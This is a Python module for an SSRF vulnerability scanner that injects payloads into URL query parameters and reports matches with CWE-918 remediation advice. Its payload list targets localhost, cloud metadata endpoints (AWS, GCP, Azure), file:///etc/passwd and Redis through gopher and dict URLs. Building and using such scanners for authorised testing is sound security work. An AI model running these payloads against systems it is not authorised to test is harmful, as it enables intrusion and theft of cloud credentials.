"""
Server-Side Request Forgery (SSRF) vulnerability scanner module.
"""

import asyncio
import logging
import re
from collections.abc import Callable
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse

from .base_scanner import BaseScanner

logger = logging.getLogger(__name__)


class SSRFScanner(BaseScanner):
    """Professional SSRF assessment engine."""

    def __init__(self, config, http_client):
        super().__init__(config, http_client)
        self.name = "SSRFScanner"
        self.description = "Server-Side Request Forgery detector"
        self.version = "1.0.0"
        self.capabilities = ["Internal Port Scanning", "Metadata API Detection", "Cloud Instance Enumeration"]

        # Payloads for common internal/private resources
        self.ssrf_payloads = [
            "http://127.0.0.1:80",
            "http://localhost:8080",
            "http://169.254.169.254/latest/meta-data/",  # AWS/OpenStack
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
            "file:///etc/passwd",
            "dict://127.0.0.1:6379/",  # Redis
            "gopher://127.0.0.1:6379/_",
        ]

        # Detection patterns in responses
        self.patterns = {
            "aws": r"ami-id|instance-id|security-groups",
            "google": r"computeMetadata|instance|project",
            "redis": r"\+PONG|\+OK",
            "internal": r"root:.*?:0:0:|<html>|<title>.*</title>",
        }

    async def scan(self, url: str, progress_callback: Callable | None = None) -> dict[str, Any]:
        """Perform SSRF assessment."""
        logger.info(f"Analyzing SSRF for {url}")
        vulnerabilities = []

        try:
            self._update_progress(progress_callback, 10, "Extracting test points")
            test_points = await self._get_test_points(url)

            if not test_points:
                return self._format_result("Clean", "No URL-based parameters found", [])

            total_tests = len(test_points) * len(self.ssrf_payloads)
            processed = 0

            for tp in test_points:
                for payload in self.ssrf_payloads:
                    processed += 1
                    self._update_progress(
                        progress_callback,
                        10 + int((processed / total_tests) * 85),
                        f"Testing {tp['name']} with {payload}",
                    )

                    test_url = self._inject_payload(tp, payload)

                    # We check for content changes or specific pattern matches
                    try:
                        response = await self.http_client.get(test_url)
                        if not response:
                            continue

                        content = await response.text()
                        headers = str(response.headers).lower()

                        # Detection Logic
                        for name, pattern in self.patterns.items():
                            if re.search(pattern, content, re.I) or re.search(pattern, headers, re.I):
                                vulnerabilities.append(
                                    self._create_vulnerability(
                                        title=f"Potential SSRF Detected ({name.upper()})",
                                        description=f"The application appears to fetch internal resources. Matched pattern: {name}",
                                        severity="critical",
                                        type="ssrf",
                                        evidence={"parameter": tp["name"], "payload": payload, "match": name},
                                        cwe_id="CWE-918",
                                        remediation="Implement a strict allowlist of permitted domains/IPs. Disallow internal IP ranges (127.0.0.1, 10.0.0.0/8, etc.).",
                                    )
                                )
                                break
                    except (asyncio.TimeoutError, Exception) as e:
                        logger.debug(f"SSRF test failed: {e}")
                        continue

            self._update_progress(progress_callback, 100, "completed")
            status = "Vulnerable" if vulnerabilities else "Clean"
            return self._format_result(
                status, f"Tested {len(test_points)} parameters. Found {len(vulnerabilities)} issues.", vulnerabilities
            )

        except Exception as e:
            logger.exception(f"SSRF scan failed: {e}")
            return self._format_result("Error", f"Internal error: {e}", [])

    async def _get_test_points(self, url: str) -> list[dict[str, Any]]:
        """Identify potential SSRF sinks."""
        points = []
        parsed = urlparse(url)
        params = parse_qsl(parsed.query)

        # Parameters often vulnerable to SSRF
        ssrf_params = ["url", "uri", "dest", "redirect", "path", "continue", "file", "image", "u", "link", "api"]

        for name, _ in params:
            if any(p in name.lower() for p in ssrf_params):
                points.append({"name": name, "type": "query", "url": url})

        # If no suggestive params, add all for thoroughness
        if not points and params:
            for name, _ in params:
                points.append({"name": name, "type": "query", "url": url})

        return points

    def _inject_payload(self, tp: dict[str, Any], payload: str) -> str:
        """Construct the URL with the payload."""
        parsed = urlparse(tp["url"])
        params = dict(parse_qsl(parsed.query))
        params[tp["name"]] = payload
        query = urlencode(params)
        return parsed._replace(query=query).geturl()
